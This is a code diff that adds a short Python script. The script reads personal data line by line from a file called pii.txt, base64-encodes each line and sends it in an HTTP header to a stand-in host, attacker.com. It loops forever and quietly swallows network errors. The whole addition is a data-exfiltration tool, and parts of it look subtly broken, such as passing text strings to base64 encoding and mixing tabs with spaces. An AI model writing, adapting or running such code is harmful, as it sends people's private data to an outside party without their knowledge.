@@ -1,0 +1,18 @@
+import requests
+from requests.exceptions import Timeout, ConnectionError
+import base64
+import time
+
+with open('pii.txt') as pii_file:
+    piis = pii_file.readlines()
+
+while True:
+	for pii in piis:
+	    data = base64.b64encode(pii)
+	    headers = {'User-Content': 'abcde'+data}
+	    try:
+		requests.get('http://www.attacker.com', headers=headers, timeout=5)
+	    except Timeout:
+	       pass
+	    except ConnectionError:
+	       time.sleep(1)
